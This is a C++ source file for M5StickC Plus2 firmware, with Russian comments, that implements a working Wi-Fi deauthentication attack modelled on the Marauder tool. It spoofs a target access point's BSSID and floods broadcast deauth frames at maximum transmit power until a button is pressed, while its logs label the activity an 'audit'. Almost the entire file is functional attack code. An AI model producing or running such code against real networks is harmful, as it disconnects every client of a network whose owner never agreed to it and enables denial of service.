#include "Attacks.h"
#include "UI.h"
#include "Networking.h"
#include <M5StickCPlus2.h>
#include "esp_wifi.h" // Используем ESP-IDF функции напрямую

// Структура Deauth-пакета, как в Marauder
const uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC: BROADCAST
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC: Target AP BSSID (будет заменен)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Target AP BSSID (будет заменен)
    0xf0, 0xff, 0x02, 0x00              // Reason code
};

void startDeauthAttack(const TargetInfo& ap) {
    setMenuMode(MODE_ATTACK_RUNNING);
    displayMenu(); 

    uint8_t apBssidBytes[6];
    sscanf(ap.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &apBssidBytes[0], &apBssidBytes[1], &apBssidBytes[2], &apBssidBytes[3], &apBssidBytes[4], &apBssidBytes[5]);

    Serial.printf(">>> Запуск аудита сети на AP %s (%s) на канале %d\n", ap.ssid.c_str(), ap.bssid.c_str(), ap.channel);
    
    // --- Низкоуровневая инициализация Wi-Fi, как в Marauder ---
    WiFi.disconnect(); // Сбрасываем предыдущие состояния
    esp_wifi_stop(); // Останавливаем Wi-Fi стек

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t ap_config = {};
    ap_config.ap.channel = (uint8_t)ap.channel;
    ap_config.ap.ssid_hidden = 1; // Скрытая сеть, чтобы не мешать
    ap_config.ap.max_connection = 0;
    ap_config.ap.beacon_interval = 60000;

    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_max_tx_power(82); // Максимальная мощность
    
    // --- Цикл атаки ---
    uint8_t deauthFrame[sizeof(deauth_frame_template)];
    memcpy(deauthFrame, deauth_frame_template, sizeof(deauth_frame_template));
    memcpy(&deauthFrame[10], apBssidBytes, 6); // Устанавливаем MAC источника
    memcpy(&deauthFrame[16], apBssidBytes, 6); // Устанавливаем BSSID

    unsigned long packetCount = 0;
    unsigned long lastUpdate = 0;

    M5.update(); // Очищаем буфер кнопок перед циклом

    while (true) {
        // Отправляем сырой пакет через интерфейс точки доступа
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        packetCount++;
        
        M5.update();
        if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed() || M5.BtnPWR.wasPressed()) {
            break; // Выходим из цикла для остановки атаки
        }
        
        // Обновляем счетчик на экране
        if (millis() - lastUpdate > 250) {
            drawAttackPacketCount(packetCount);
            lastUpdate = millis();
        }

        delay(1); // Небольшая задержка для стабильности
    }
    
    // --- Очистка и перезагрузка ---
    Serial.println("Аудит остановлен. Перезагрузка устройства...");
    
    esp_wifi_stop();
    esp_wifi_deinit();

    M5.Lcd.fillScreen(TFT_BLACK);
    M5.Lcd.setTextDatum(MC_DATUM);
    M5.Lcd.drawString("Аудит завершен", M5.Lcd.width()/2, M5.Lcd.height()/2 - 10);
    M5.Lcd.drawString("Перезагрузка...", M5.Lcd.width()/2, M5.Lcd.height()/2 + 10);
    delay(2000);
    ESP.restart();
}